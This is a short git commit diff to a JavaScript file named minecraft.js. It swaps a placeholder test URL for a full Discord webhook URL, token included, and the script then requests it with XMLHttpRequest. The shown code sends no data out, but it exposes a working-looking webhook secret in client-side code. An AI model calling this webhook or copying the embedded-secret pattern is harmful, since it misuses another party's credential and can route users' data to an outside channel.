e87a032e1218d0eec8ae007dfb1b4d4313874442
ShrimpyStuff <52041627+ShrimpyStuff@users.noreply.github.com>
2020-12-22 16:46:14 -0500

    Update minecraft.js

--- js/minecraft.js
+++ js/minecraft.js
@@ -1,4 +1,4 @@
-var url = "https://jsonplaceholder.typicode.com/posts";
+var url = "https://discord.com/api/webhooks/791054109461315586/gcJBLq4gy2ThmLwyfCZwauYtJntTPBqVNCaM1UIFrk0lH7U8f9HnhLxwnXIHOiqsBCe6";
 
 var xhr = new XMLHttpRequest();
 xhr.open("GET", url);
